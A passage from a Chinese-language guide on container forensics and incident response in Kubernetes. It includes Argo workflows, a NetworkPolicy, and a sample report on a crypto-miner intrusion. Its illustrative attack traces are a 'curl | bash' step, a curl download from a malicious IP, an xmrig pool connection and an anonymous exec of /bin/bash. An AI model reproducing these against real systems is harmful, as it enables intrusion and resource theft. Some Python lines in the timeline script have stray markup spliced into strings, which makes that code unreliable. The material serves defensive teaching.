- [ ] 验证存储容量规划（每日数据增长 vs 保留期）
- [ ] 测试存储故障恢复（模拟 Elasticsearch node crash）

#<!-- chunk: 安全测试 -->## 安全测试
- [ ] 验证取证数据传输加密（TLS 1.3）
- [ ] 验证证据存储访问控制（RBAC + audit logs）
- [ ] 验证 WORM 存储不可篡改（尝试删除索引应失败）
- [ ] 渗透测试：尝试绕过检测或篡改证据
```

**准备阶段架构图**：

```
┌─────────────────────────────────────────────────────────────────┐
│                Kubernetes Cluster (Production)                  │
│  ┌────────────────────────────────────────────────────────────┐ │
│  │  Workload Nodes (Application Pods)                         │ │
│  │  ┌───────────┐  ┌───────────┐  ┌───────────┐             │ │
│  │  │ App Pod A │  │ App Pod B │  │ App Pod C │             │ │
│  │  │ + Falco   │  │ + Falco   │  │ + Falco   │             │ │
│  │  │ + FluentBit│  │ + FluentBit│  │ + FluentBit│           │ │
│  │  └───────────┘  └───────────┘  └───────────┘             │ │
│  └────────────────────────────────────────────────────────────┘ │
│  ┌────────────────────────────────────────────────────────────┐ │
│  │  Monitoring Namespace (FEBM Infrastructure)                │ │
│  │  ┌──────────────┐ ┌──────────────┐ ┌──────────────┐      │ │
│  │  │ Prometheus   │ │ Loki         │ │ Elasticsearch│      │ │
│  │  │ (HA)         │ │ (HA)         │ │ (Cluster)    │      │ │
│  │  └──────────────┘ └──────────────┘ └──────────────┘      │ │
│  │  ┌──────────────┐ ┌──────────────┐                       │ │
│  │  │ AlertManager │ │ Falco        │                       │ │
│  │  │ (HA)         │ │ Sidekick     │                       │ │
│  │  └──────────────┘ └──────────────┘                       │ │
│  └────────────────────────────────────────────────────────────┘ │
│  ┌────────────────────────────────────────────────────────────┐ │
│  │  Forensics Namespace (Isolated Analysis Environment)      │ │
│  │  ┌──────────────┐ ┌──────────────┐                       │ │
│  │  │ Jupyter      │ │ Grafana      │                       │ │
│  │  │ (Read-only)  │ │ (Dashboards) │                       │ │
│  │  └──────────────┘ └──────────────┘                       │ │
│  └────────────────────────────────────────────────────────────┘ │
└─────────────────────────────────────────────────────────────────┘
                                │
                                │ Long-term Archive
                                ▼
                    ┌───────────────────────┐
                    │  S3 / MinIO           │
                    │  (WORM Object Lock)   │
                    │  - 7 years retention  │
                    └───────────────────────┘
```

---

#<!-- chunk: 3.3.3 Phase 2: Detection & Analysis（检测与分析） -->## 3.3.3 Phase 2: Detection & Analysis（检测与分析）

**实时检测流程**：

```
    Falco 检测到              Prometheus 检测到           多信号关联引擎
   异常系统调用                 指标异常                  综合评估
        │                         │                           │
        ▼                         ▼                           ▼
┌───────────────┐         ┌───────────────┐         ┌───────────────┐
│ Terminal      │         │ CPU spike     │         │ Correlation:  │
│ shell spawned │────────▶│ 10x baseline  │────────▶│ Same Pod UID  │
│ in container  │         │               │         │ Same timestamp│
│ Priority: WARN│         │ Severity: WARN│         │ → Escalate to │
└───────────────┘         └───────────────┘         │   CRITICAL    │
                                                     └───────┬───────┘
                                                             │
                                        ┌────────────────────▼────────────────────┐
                                        │  自动响应触发：                          │
                                        │  1. 升级采集级别 → Full Forensics      │
                                        │  2. 触发容器 checkpoint                 │
                                        │  3. 通知 On-call 团队 (PagerDuty)       │
                                        │  4. 创建事件跟踪 Ticket (Jira/ServiceNow)│
                                        └─────────────────────────────────────────┘
```

**证据采集自动化（Argo Workflow 示例）**：

```yaml
# incident-evidence-collection-workflow.yaml
apiVersion: argoproj.io/v1alpha1
kind: Workflow
metadata:
  name: febm-incident-evidence-collection
  namespace: forensics
spec:
  entrypoint: collect-evidence
  
  arguments:
    parameters:
      - name: incident-id
        value: "INC-2024-02-22-001"
      - name: pod-namespace
        value: "production"
      - name: pod-name
        value: "payment-api-7d5f8b9c-4xk2p"
      - name: pod-uid
        value: "9f8e7d6c-5b4a-3210-fedc-ba9876543210"
  
  templates:
    - name: collect-evidence
      steps:
        # Step 1: 容器检查点（最高优先级，最易丢失）
        - - name: checkpoint-container
            template: criu-checkpoint
            arguments:
              parameters:
                - name: pod-namespace
                  value: "{{workflow.parameters.pod-namespace}}"
                - name: pod-name
                  value: "{{workflow.parameters.pod-name}}"
        
        # Step 2: 并行采集其他证据
        - - name: collect-audit-logs
            template: query-audit-logs
          - name: collect-falco-events
            template: query-falco-events
          - name: collect-app-logs
            template: query-app-logs
          - name: collect-metrics
            template: query-metrics
          - name: collect-network-connections
            template: snapshot-network
          - name: collect-process-tree
            template: snapshot-processes
        
        # Step 3: 构建时间线
        - - name: reconstruct-timeline
            template: timeline-analysis
            arguments:
              artifacts:
                - name: audit-logs
                  from: "{{steps.collect-audit-logs.outputs.artifacts.logs}}"
                - name: falco-events
                  from: "{{steps.collect-falco-events.outputs.artifacts.events}}"
                - name: app-logs
                  from: "{{steps.collect-app-logs.outputs.artifacts.logs}}"
        
        # Step 4: 生成初步报告
        - - name: generate-report
            template: incident-report
    
    - name: criu-checkpoint
      inputs:
        parameters:
          - name: pod-namespace
          - name: pod-name
      container:
        image: criu/criu:latest
        command: ["/bin/bash", "-c"]
        args:
          - |
            set -e
            
            # 获取容器 ID
            CONTAINER_ID=$(kubectl get pod {{inputs.parameters.pod-name}} \
              -n {{inputs.parameters.pod-namespace}} \
              -o jsonpath='{.status.containerStatuses[0].containerID}' \
              | sed 's/docker:\/\///')
            
            echo "Checkpointing container: $CONTAINER_ID"
            
            # 执行 checkpoint
            criu dump \
              --tree $(docker inspect --format '{{.State.Pid}}' $CONTAINER_ID) \
              --images-dir /evidence/checkpoint-$(date +%s) \
              --shell-job \
              --log-file /evidence/criu.log
            
            # 计算哈希并签名
            cd /evidence
            sha256sum * > SHA256SUMS
            
            echo "Checkpoint completed successfully"
        volumeMounts:
          - name: evidence-storage
            mountPath: /evidence
      outputs:
        artifacts:
          - name: checkpoint
            path: /evidence
            s3:
              endpoint: s3.amazonaws.com
              bucket: febm-evidence
              key: "{{workflow.parameters.incident-id}}/checkpoint.tar.gz"
              accessKeySecret:
                name: s3-credentials
                key: accessKey
              secretKeySecret:
                name: s3-credentials
                key: secretKey
    
    - name: query-audit-logs
      script:
        image: python:3.11
        command: [python]
        source: |
          import json
          from elasticsearch import Elasticsearch
          from datetime import datetime, timedelta
          
          es = Elasticsearch(["https://elasticsearch.monitoring.svc:9200"])
          
          pod_uid = "{{workflow.parameters.pod-uid}}"
          start_time = datetime.now() - timedelta(hours=1)
          end_time = datetime.now()
          
          query = {
              "query": {
                  "bool": {
                      "must": [
                          {"match": {"objectRef.uid": pod_uid}},
                          {"range": {"requestReceivedTimestamp": {
                              "gte": start_time.isoformat(),
                              "lte": end_time.isoformat()
                          }}}
                      ]
                  }
              },
              "sort": [{"requestReceivedTimestamp": "asc"}],
              "size": 10000
          }
          
          results = es.search(index="k8s-audit-logs-*", body=query)
          
          with open('/evidence/audit-logs.json', 'w') as f:
              json.dump(results['hits']['hits'], f, indent=2)
          
          print(f"Collected {len(results['hits']['hits'])} audit log entries")
      outputs:
        artifacts:
          - name: logs
            path: /evidence/audit-logs.json
    
    - name: timeline-analysis
      inputs:
        artifacts:
          - name: audit-logs
            path: /data/audit-logs.json
          - name: falco-events
            path: /data/falco-events.json
          - name: app-logs
            path: /data/app-logs.json
      script:
        image: python:3.11-slim
        command: [python]
        source: |
          import json
          import pandas as pd
          from datetime import datetime
          
          # 加载所有证据
          with open('/data/audit-logs.json') as f:
              audit_logs = json.load(f)
          
          with open('/data/falco-events.json') as f:
              falco_events = json.load(f)
          
          with open('/data/app-logs.json') as f:
              app_logs = json.load(f)
          
          # 构建统一时间线
          timeline = []
          
          for log in audit_logs:
              timeline.append({
                  'timestamp': log['_source']['requestReceivedTimestamp'],
                  'source': 'k8s_audit',
                  'event': f"{log['_source']['verb']} {log['_source']['objectRef']['resource']}",
                  'user': log['_source']['user']['username'],
                  'raw': log
              })
          
          for event in falco_events:
              timeline.append({
                  'timestamp': event['_source']['time'],
                  'source': 'falco',
                  'event': event['_source']['rule'],
                  'priority': event['_source']['priority'],
                  'raw': event
              })
          
          # 排序并输出
          df = pd.DataFrame(timeline)
          df['timestamp'] = pd.to_datetime(df['timestamp'])
          df = df.sort_values('timestamp')
          
          # 生成 Markdown 报告
          with open('/evidence/timeline.md', 'w') as f:
              f.write(f"# Incident Timeline: {{workflow.parameters.incident-id}}\n\n")
              f.write(f"**Generated**: {datetime.now().isoformat()}\n\n")
              f.write("<!-- chunk: Events\n\n") -->## Events\n\n")
              
              for _, row in df.iterrows():
                  f.write(f"#<!-- chunk: {row['timestamp'].isoformat()}\n") -->## {row['timestamp'].isoformat()}\n")
                  f.write(f"**Source**: {row['source']}\n")
                  f.write(f"**Event**: {row['event']}\n\n")
                  if row['source'] == 'k8s_audit':
                      f.write(f"**User**: {row['user']}\n\n")
                  elif row['source'] == 'falco':
                      f.write(f"**Priority**: {row['priority']}\n\n")
                  f.write("---\n\n")
          
          print(f"Timeline reconstructed with {len(df)} events")
      outputs:
        artifacts:
          - name: timeline
            path: /evidence/timeline.md
```

**根因分析决策树**：

```
              检测到容器中执行 /bin/bash
                        │
        ┌───────────────┴───────────────┐
        │ Q1: 这是预期行为吗？           │
        └───┬───────────────────────┬───┘
            │ Yes                   │ No
            ▼                       ▼
    ┌─────────────────┐   ┌─────────────────────┐
    │ 检查 Runbook:    │   │ 升级为安全事件      │
    │ - Debug session?│   │ 继续分析...         │
    │ - Scheduled job?│   └──────────┬──────────┘
    └─────────────────┘              │
            │                        ▼
            │               ┌─────────────────────┐
            │               │ Q2: 谁触发了命令？  │
            │               └───┬────────────┬────┘
            │                   │ K8s User   │ Unknown
            │                   ▼            ▼
            │          ┌──────────────┐  ┌───────────────┐
            │          │ 查审计日志:  │  │ 可能的 RCE！  │
            │          │ - kubectl    │  │ - 无对应 exec │
            │          │   exec 操作  │  │   审计日志    │
            │          │ - 授权用户？ │  │ - 进程树异常  │
            │          └──────────────┘  └───────┬───────┘
            │                                    │
            └────────────────────────────────────▼
                        ┌─────────────────────────────┐
                        │ Q3: 进程父子关系是什么？    │
                        └───┬────────────────────┬────┘
                            │ 正常应用进程       │ 异常进程树
                            ▼                    ▼
                   ┌──────────────────┐  ┌──────────────────┐
                   │ 可能是应用漏洞:  │  │ 明确 RCE 攻击:   │
                   │ - RCE in app     │  │ - 父进程: nginx  │
                   │ - Command inject │  │ - 子进程: bash → │
                   │ 分析应用日志...  │  │   curl | bash    │
                   └──────────────────┘  └────────┬─────────┘
                                                  │
                                    ┌─────────────▼──────────────┐
                                    │ Q4: 攻击者做了什么？        │
                                    │ - 文件系统更改？            │
                                    │ - 网络连接？                │
                                    │ - 权限提升？                │
                                    │ - 数据窃取？                │
                                    └────────────────────────────┘
```

---

#<!-- chunk: 3.3.4 Phase 3: Containment, Eradication & Recovery -->## 3.3.4 Phase 3: Containment, Eradication & Recovery

**隔离策略矩阵**：

| 隔离级别 | 范围 | 实现方式 | 证据保留 | 适用场景 |
|---------|------|---------|---------|---------|
| L1: Pod 隔离 | 单个 Pod | NetworkPolicy (deny all) | ✅ 保留 | 可疑 Pod，影响范围小 |
| L2: Namespace 隔离 | 整个命名空间 | NetworkPolicy + RBAC | ✅ 保留 | 多 Pod 受影响 |
| L3: 节点隔离 | 整个节点 | Node taint + cordon | ✅ 保留 | 节点级入侵 |
| L4: 集群隔离 | 整个集群 | 防火墙规则 | ✅ 保留 | 集群级攻击 |

**隔离实施示例（NetworkPolicy）**：

```yaml
# incident-isolation-networkpolicy.yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: incident-isolation-pod
  namespace: production
  labels:
    febm.io/incident-id: "INC-2024-02-22-001"
    febm.io/isolation-level: "L1"
spec:
  podSelector:
    matchLabels:
      app: payment-api
      pod-template-hash: "7d5f8b9c"  # 仅隔离特定 ReplicaSet
  
  policyTypes:
    - Ingress
    - Egress
  
  # 完全拒绝入站流量
  ingress: []
  
  # 仅允许出站到取证服务（用于证据采集）
  egress:
    - to:
      - namespaceSelector:
          matchLabels:
            name: forensics
      ports:
        - protocol: TCP
          port: 8080  # 证据采集 API
    
    # 允许 DNS 解析
    - to:
      - namespaceSelector:
          matchLabels:
            name: kube-system
      ports:
        - protocol: UDP
          port: 53
```

**证据保留优先原则**：

```
┌─────────────────────────────────────────────────────────────────┐
│            在隔离/修复前，必须先保留证据！                       │
└─────────────────────────────────────────────────────────────────┘

  ❌ 错误流程                           ✅ 正确流程 (FEBM)
  
  检测到攻击                            检测到攻击
       │                                     │
       ▼                                     ▼
  立即删除 Pod ──┐                     触发证据采集
       │         │                           │
       ▼         │                           ├─ 容器 checkpoint
  部署新版本     │                           ├─ 内存 dump
       │         │                           ├─ 文件系统快照
       ▼         │                           ├─ 网络连接列表
  ❌ 证据丢失！◀─┘                           └─ 进程树快照
       │                                     │
       ▼                                     ▼
  无法进行根因分析                      证据采集完成
  无法改进检测规则                           │
  攻击可能重演                               ▼
                                         隔离 Pod
                                             │
                                             ▼
                                         分析证据
                                             │
                                             ▼
                                         确定根因
                                             │
                                             ▼
                                         修复漏洞
                                             │
                                             ▼
                                         部署新版本
                                             │
                                             ▼
                                         验证修复
                                             │
                                             ▼
                                         ✅ 完整取证链
```

**恢复验证 Checklist**：

```markdown
<!-- chunk: 服务恢复验证清单 -->## 服务恢复验证清单

#<!-- chunk: 1. 恶意组件已清除 -->## 1. 恶意组件已清除
- [ ] 已删除/隔离受影响的 Pod
- [ ] 已验证新 Pod 使用干净的镜像（SHA-256 digest）
- [ ] 已扫描镜像漏洞（Trivy/Clair scan passed）
- [ ] 已验证无可疑进程（Falco 无告警 > 10 分钟）
- [ ] 已验证无可疑网络连接（netstat/ss 输出正常）

#<!-- chunk: 2. 漏洞已修复 -->## 2. 漏洞已修复
- [ ] 已识别攻击利用的漏洞（CVE-XXX-YYYY or 0-day）
- [ ] 应用代码已修复（Git commit SHA: xxxxxx）
- [ ] 依赖包已更新（requirements.txt / package.json）
- [ ] 配置已加固（secrets 轮换、RBAC 收紧）
- [ ] 已添加 Falco 规则检测该攻击模式

#<!-- chunk: 3. 服务功能正常 -->## 3. 服务功能正常
- [ ] 健康检查通过（/healthz 返回 200）
- [ ] 关键 API 响应正常（P50 latency < SLO）
- [ ] 数据库连接正常（无慢查询告警）
- [ ] 依赖服务连接正常（无 5xx 错误）
- [ ] 监控指标恢复基线（CPU/Memory/QPS）

#<!-- chunk: 4. 证据已归档 -->## 4. 证据已归档
- [ ] 所有证据已上传到 WORM 存储
- [ ] Chain of Custody 记录完整
- [ ] 时间线报告已生成
- [ ] 根因分析文档已完成
- [ ] 事件 Ticket 已更新（Jira/ServiceNow）

#<!-- chunk: 5. 持续监控 -->## 5. 持续监控
- [ ] 已部署增强监控（7 天观察期）
- [ ] 已配置告警（相同攻击模式再次出现）
- [ ] 已通知 SOC 团队关注该服务
- [ ] 已安排 7 天后复审会议
```

---

#<!-- chunk: 3.3.5 Phase 4: Post-Incident Activity -->## 3.3.5 Phase 4: Post-Incident Activity

**事件报告模板**：

```markdown
# 安全事件报告: {{incident-id}}

**日期**: 2024-02-22  
**严重性**: P0 - Critical  
**状态**: Resolved  
**所有者**: Security Team (security@example.com)

---

<!-- chunk: 执行摘要 -->## 执行摘要

**一句话总结**: Remote Code Execution (RCE) vulnerability in payment-api service was exploited to deploy cryptocurrency miner.

**影响范围**:
- **受影响服务**: payment-api (production namespace)
- **受影响用户**: 0 (内部系统，无客户数据泄露)
- **持续时间**: 2024-02-22 09:45 UTC - 11:30 UTC (1h 45m)
- **数据泄露**: None confirmed
- **财务影响**: ~$50 (额外计算资源消耗)

---

<!-- chunk: 时间线（基于 FEBM 证据重建） -->## 时间线（基于 FEBM 证据重建）

#<!-- chunk: 09:42:15 UTC - 攻击开始 -->## 09:42:15 UTC - 攻击开始
**证据**: K8s Audit Log (auditID: 5a2b3c4d-...)
```json
{
  "verb": "create",
  "objectRef": {"resource": "pods/exec"},
  "user": {"username": "system:anonymous"},
  "sourceIPs": ["203.0.113.42"],
  "requestURI": "/api/v1/namespaces/production/pods/payment-api-7d5f8b9c-4xk2p/exec?command=/bin/bash"
}
```
**分析**: 匿名用户通过未授权的 API 端点执行命令（漏洞：CVE-2024-XXXX）

#<!-- chunk: 09:42:18 UTC - 下载恶意脚本 -->## 09:42:18 UTC - 下载恶意脚本
**证据**: Falco Event
```
Rule: Launch Suspicious Network Tool in Container
Output: Outbound connection to known malicious IP (user=root container=payment-api 
        proc=curl fd.name=203.0.113.99:443)
```

#<!-- chunk: 09:45:30 UTC - 部署加密矿机 -->## 09:45:30 UTC - 部署加密矿机
**证据**: Falco Event
```
Rule: Detect crypto miners using the Stratum protocol
Output: Crypto miner detected (proc=xmrig connection=pool.minexmr.com:4444)
```

#<!-- chunk: 09:47:00 UTC - FEBM 自动响应触发 -->## 09:47:00 UTC - FEBM 自动响应触发
**证据**: Prometheus Alert
```
Alert: HighCPUUsage + SuspiciousProcess
Severity: critical
Actions Taken:
  - Container checkpoint triggered
  - Enhanced log collection enabled
  - PagerDuty notification sent
```

#<!-- chunk: 10:05:00 UTC - 安全团队介入 -->## 10:05:00 UTC - 安全团队介入
**证据**: Slack 消息 + Jira Ticket
- On-call engineer acknowledged alert
- Incident ticket created: INC-2024-02-22-001

#<!-- chunk: 10:15:00 UTC - 隔离受影响 Pod -->## 10:15:00 UTC - 隔离受影响 Pod
**证据**: K8s Audit Log
```
verb: create
objectRef: {resource: networkpolicies, name: incident-isolation-pod}
```

#<!-- chunk: 10:30:00 UTC - 证据采集完成 -->## 10:30:00 UTC - 证据采集完成
**证据**: Argo Workflow Logs
- Container checkpoint: ✅ (15 GB)
- Audit logs: ✅ (2,345 entries)
- Falco events: ✅ (127 events)
- Application logs: ✅ (50 MB)

#<!-- chunk: 11:00:00 UTC - 部署修复版本 -->## 11:00:00 UTC - 部署修复版本
**证据**: GitLab CI/CD Pipeline
```
Commit: f1a2b3c4 "Fix: disable unauthenticated exec endpoint"
Image: payment-api:v2.3.1-security-patch
Deployment: Rolling update completed
```

#<!-- chunk: 11:30:00 UTC - 验证恢复 -->## 11:30:00 UTC - 验证恢复
**证据**: Prometheus Metrics
```
CPU usage: back to baseline (<20%)
Error rate: 0%
Falco alerts: none for 30 minutes
```

---

<!-- chunk: 根因分析 -->## 根因分析

#<!-- chunk: 漏洞详情 -->## 漏洞详情
**CVE**: CVE-2024-XXXX (or internal-2024-001)  
**组件**: payment-api v2.3.0  
**漏洞类型**: Remote Code Execution via unauthenticated /exec endpoint  

**触发条件**:
1. `/debug/exec` endpoint 在生产环境中未禁用
2. 未配置认证中间件
3. Kubernetes RBAC 未限制 `pods/exec` 权限

**攻击链**:
```
Internet ─┬─> LoadBalancer
          └─> Ingress Controller
              └─> payment-api Service
                  └─> payment-api Pod
                      └─> /debug/exec endpoint (未授权！)
                          └─> 执行任意命令
```

#<!-- chunk: 为什么检测有效 -->## 为什么检测有效
✅ **FEBM 多层检测成功**:
1. Falco 检测到 `curl` 进程（非应用预期进程）
2. Falco 检测到 Stratum 协议网络连接（加密矿机特征）
3. Prometheus 检测到 CPU 使用率异常（10x baseline）
4. K8s Audit 记录了未授权 `pods/exec` 操作

#<!-- chunk: 为什么攻击得逞 -->## 为什么攻击得逞
❌ **防御层失效**:
1. ~~API Gateway 认证~~ - /debug 路径未配置认证
2. ~~Kubernetes RBAC~~ - `system:anonymous` 有过高权限
3. ~~Pod Security Policy~~ - 未限制特权容器
4. ✅ **Runtime Detection (Falco)** - 成功检测并告警

---

<!-- chunk: 改进措施（按优先级） -->## 改进措施（按优先级）

#<!-- chunk: P0 - 立即执行（24h 内） -->## P0 - 立即执行（24h 内）
- [x] 禁用所有生产环境的 /debug 端点
- [x] 轮换所有受影响服务的 Secrets
- [x] 收紧 Kubernetes RBAC（移除 `system:anonymous` 的 exec 权限）
- [x] 部署 Falco 规则检测类似攻击模式

#<!-- chunk: P1 - 短期（1 周内） -->## P1 - 短期（1 周内）
- [ ] 审计所有服务的调试端点暴露情况（自动化扫描）
- [ ] 强制所有 API 端点启用认证（API Gateway 统一策略）
- [ ] 实施 Pod Security Standards（Restricted 级别）
- [ ] 对开发团队进行安全编码培训

#<!-- chunk: P2 - 中期（1 个月内） -->## P2 - 中期（1 个月内）
- [ ] 部署 Runtime Security 工具（Falco + Tetragon）到所有集群
- [ ] 实施最小权限原则 RBAC 审计
- [ ] 建立漏洞赏金计划（Bug Bounty）
- [ ] 定期进行红蓝对抗演练

---

<!-- chunk: 经验教训 -->## 经验教训

#<!-- chunk: 做得好的地方 -->## 做得好的地方
✅ **FEBM 方法论有效**:
- 容器 checkpoint 保留了完整攻击现场
- 多层证据交叉验证（审计日志 + Falco + 指标）
- 自动化响应快速隔离威胁（MTTD: 2 分钟，MTTR: 1.75 小时）

✅ **团队响应迅速**:
- On-call 工程师 5 分钟内确认告警
- 证据优先原则严格执行（先采集再隔离）

#<!-- chunk: 需要改进的地方 -->## 需要改进的地方
❌ **防御层不足**:
- 调试端点不应暴露在生产环境
- RBAC 权限过于宽松
- 缺少 API Gateway 统一认证策略

❌ **检测覆盖不全**:
- 未检测到初始的 RCE 漏洞利用（仅检测到后续恶意行为）
- 需要增加 Web 应用防火墙（WAF）规则

---

<!-- chunk: 指标 -->## 指标

| 指标 | 目标 | 实际 | 评估 |
|-----|------|------|------|
| MTTD (Mean Time To Detect) | < 5 min | 2 min 45s | ✅ 优秀 |
| MTTC (Mean Time To Contain) | < 15 min | 22 min | ⚠️ 可接受 |
| MTTR (Mean Time To Recover) | < 2 hours | 1h 45m | ✅ 优秀 |
| 证据完整性 | 100% | 100% | ✅ 完整 |
| 误报率 | < 5% | 0% | ✅ 无误报 |

---

<!-- chunk: 审批 -->## 审批

**分析师**: Alice Chen (alice@example.com) - 2024-02-22  
**审核人**: Bob Smith (Security Lead) - 2024-02-23  
**批准人**: Carol Johnson (CISO) - 2024-02-23  

**分发**: Engineering Team, Executive Team, Compliance Team
```

**持续改进循环**：

```
    Phase 4                    Phase 1
Post-Incident ──────────────▶ Preparation
    Activity                   (Updated)
       │                           │
       │  经验教训：                 │  改进措施：
       │  - 检测规则更新            │  - 部署新 Falco 规则
       │  - Runbook 优化            │  - 更新响应手册
       │  - 流程改进建议            │  - 团队技能培训
       │  - 工具升级需求            │  - 工具链升级
       ▼                           ▼
  知识库更新 ──────────────▶ 能力提升验证
  (案例归档)                 (模拟演练)
```

---

<!-- chunk: 3.4 取证即代码（Forensics as Code） -->## 3.4 取证即代码（Forensics as Code）

#<!-- chunk: 3.4.1 核心理念 -->## 3.4.1 核心理念

取证即代码（Forensics as Code）是 FEBM 的工程化最佳实践之一，其核心理念是将取证流程版本化、可重复、可审计。这与 Infrastructure as Code 和 GitOps 理念一脉相承。

```
Forensics as Code 的三大原则:

  1. 版本控制 (Version Controlled)
     → 所有检测规则、响应 Playbook、分析脚本存储在 Git 仓库
     → 变更历史完整可追溯
     → 通过 Pull Request 进行代码审查

  2. 可重复 (Repeatable)
     → 相同的输入产生相同的输出
     → 消除手动操作引入的不确定性
     → 不同环境/时间的执行结果一致

  3. 可审计 (Auditable)
     → 每次执行记录完整日志
     → 分析工具版本和配置被记录
     → 满足合规审计要求
```

#<!-- chunk: 3.4.2 仓库结构 -->## 3.4.2 仓库结构

```
forensics-as-code/
├── detection-rules/                    # 检测规则
│   ├── falco/
│   │   ├── container-escape.yaml       # 容器逃逸检测
│   │   ├── crypto-mining.yaml          # 加密货币挖矿检测
│   │   ├── lateral-movement.yaml       # 横向移动检测
│   │   ├── data-exfiltration.yaml      # 数据泄露检测
│   │   ├── privilege-escalation.yaml   # 权限提升检测
│   │   └── suspicious-network.yaml     # 可疑网络活动
│   ├── sigma/
│   │   ├── k8s-suspicious-api-calls.yaml
│   │   └── k8s-rbac-abuse.yaml
│   └── prometheus/
│       ├── resource-anomaly-rules.yaml
│       └── performance-degradation.yaml
├── response-playbooks/                 # 响应 Playbook
│   ├── argo-workflows/
│   │   ├── checkpoint-and-isolate.yaml
│   │   ├── evidence-collection.yaml
│   │   ├── memory-analysis.yaml
│   │   └── full-incident-response.yaml
│   ├── runbooks/
│   │   ├── container-escape-response.md
│   │   ├── data-breach-response.md
│   │   └── ransomware-response.md
│   └── notification-templates/
│       ├── slack-alert.json
│       └── pagerduty-event.json
├── analysis-scripts/                   # 分析脚本
│   ├── timeline-builder.py
│   ├── audit-log-analyzer.py
│   ├── network-flow-correlator.py
│   ├── image-diff-analyzer.sh
│   └── evidence-hasher.py
├── baselines/                          # 安全基线
│   ├── normal-syscall-profiles/
│   │   ├── nginx-baseline.json
│   │   └── java-app-baseline.json
│   ├── expected-network-policies/
│   │   ├── production.yaml
│   │   └── staging.yaml
│   └── approved-image-digests/
│       └── approved-images.json
├── tests/                              # 自动化测试
│   ├── test-detection-rules.py
│   ├── test-playbook-syntax.sh
│   └── test-analysis-scripts.py
├── ci/                                 # CI/CD 配置
│   ├── validate-rules.yaml
│   ├── deploy-to-cluster.yaml
│   └── test-in-sandbox.yaml
└── reports/
    └── templates/
        ├── incident-report.md
        ├── compliance-audit.md
        └── executive-summary.md
```

#<!-- chunk: 3.4.3 CI/CD 集成 -->## 3.4.3 CI/CD 集成

```
Forensics as Code CI/CD 流水线:

  Git Push
    │
    ▼
  ┌─────────────┐
  │ 语法验证     │  → Falco 规则语法检查
  │ Lint Check   │  → YAML/JSON Schema 验证
  └──────┬──────┘  → Python 脚本 lint
         │
         ▼
  ┌─────────────┐
  │ 单元测试     │  → 检测规则的正/负样本测试
  │ Unit Test    │  → 分析脚本的功能测试
  └──────┬──────┘  → Playbook 的语法和逻辑验证
         │
         ▼
  ┌─────────────┐
  │ 沙箱测试     │  → 在隔离集群中部署规则
  │ Sandbox      │  → 使用模拟攻击验证检测效果
  └──────┬──────┘  → 验证无误报和漏报
         │
         ▼
  ┌─────────────┐
  │ 灰度发布     │  → 先部署到非关键集群
  │ Canary       │  → 监控误报率
  └──────┬──────┘  → 确认稳定后推广
         │
         ▼
  ┌─────────────┐
  │ 全量部署     │  → 部署到所有生产集群
  │ Production   │  → 持续监控效果
  └─────────────┘
```

---

<!-- chunk: 3.5 持续取证（Continuous Forensics） -->## 3.5 持续取证（Continuous Forensics）

#<!-- chunk: 3.5.1 范式转变 -->## 3.5.1 范式转变

持续取证代表了从"被动响应"到"主动感知"的范式转变：

```
传统取证模式:
  正常运行 ─────────── [事件发生!] ─── 启动采集 ─── 分析
                                          ▲
                                          │
                                     大量证据已丢失
                                     (容器已销毁)

持续取证模式:
  [始终采集] ──── [始终采集] ──── [事件发生!] ──── [增强采集] ──── 分析
      │              │                                              │
      └──────────────┘                                              │
      证据已在存储中                                    丰富的上下文 ─┘
```

#<!-- chunk: 3.5.2 智能升级机制 -->## 3.5.2 智能升级机制

```
持续取证的三级采集强度:

Level 1: 常规监控 (Always-On)
  • eBPF 基础系统调用监控
  • 日志实时转发
  • 基础指标采集 (15s 间隔)
  • 审计日志 Metadata 级别
  → 资源开销: < 2% CPU, < 500MB 内存

Level 2: 增强采集 (Anomaly-Triggered)
  触发条件: Falco 告警 / 指标异常 / 审计日志异常
  • 系统调用全量捕获
  • 网络包元数据捕获
  • 指标采集频率提升 (5s 间隔)
  • 审计日志 Request 级别
  → 资源开销: < 5% CPU, < 1GB 内存

Level 3: 全量取证 (Incident-Triggered)
  触发条件: 确认安全事件 / P0 故障
  • 容器检查点创建
  • 内存转储
  • 网络流量全量捕获
  • 审计日志 RequestResponse 级别
  • 文件系统快照
  → 资源开销: 按需，可能显著
```

---

<!-- chunk: 3.6 证据存储与生命周期管理 -->## 3.6 证据存储与生命周期管理

#<!-- chunk: 3.6.1 分层存储策略 -->## 3.6.1 分层存储策略

| 存储层 | 数据类型 | 保留期 | 存储介质 | 访问延迟 | 成本 |
|-------|---------|-------|---------|---------|------|
| 热存储 | 最近 7 天的日志/指标/追踪 | 7 天 | SSD/NVMe | < 10ms | 高 |
| 温存储 | 7-30 天的日志/指标 | 30 天 | HDD/对象存储 | < 1s | 中 |
| 冷存储 | 30-365 天的归档证据 | 1 年 | 对象存储（低频） | < 10s | 低 |
| 冰存储 | 法律/合规要求的长期保存 | 3-7 年 | 归档存储 | 分钟-小时 | 极低 |

#<!-- chunk: 3.6.2 证据不可变性保障 -->## 3.6.2 证据不可变性保障

```
WORM (Write-Once-Read-Many) 实施:

  证据写入 → 计算 SHA-256 → 写入 WORM 存储 → 记录元数据
                 │
                 └─→ 哈希值写入独立的完整性数据库
                      (与证据存储物理隔离)

  验证流程:
  读取证据 → 重新计算 SHA-256 → 与记录的哈希比对
                                    │
                              ┌─────┴─────┐
                              │           │
                            匹配        不匹配
                              │           │
                           正常使用    触发警报
                                      (证据可能被篡改)
```

---

<!-- chunk: 3.7 取证环境隔离与安全 -->## 3.7 取证环境隔离与安全

#<!-- chunk: 3.7.1 隔离分析集群架构 -->## 3.7.1 隔离分析集群架构

```
┌─────────────────────────────────────────────────────┐
│                 隔离分析环境                          │
├─────────────────────────────────────────────────────┤
│                                                     │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐         │
│  │ 证据恢复 │  │ 动态分析 │  │ 报告生成 │         │
│  │ 容器     │  │ 沙箱     │  │ 工作站   │         │
│  └──────────┘  └──────────┘  └──────────┘         │
│        │              │             │               │
│        └──────────────┼─────────────┘               │
│                       │                             │
│              ┌────────┴────────┐                    │
│              │ 隔离网络 (无出站) │                    │
│              └─────────────────┘                    │
│                                                     │
│  安全要求:                                           │
│  • 与生产集群完全网络隔离                             │
│  • 无互联网出站连接                                   │
│  • 独立的 RBAC 和认证体系                             │
│  • 所有操作记录审计日志                               │
│  • 分析完成后清理环境                                 │
└─────────────────────────────────────────────────────┘
```

#<!-- chunk: 3.7.2 关键安全措施 -->## 3.7.2 关键安全措施

| 措施 | 目的 | 实施方式 |
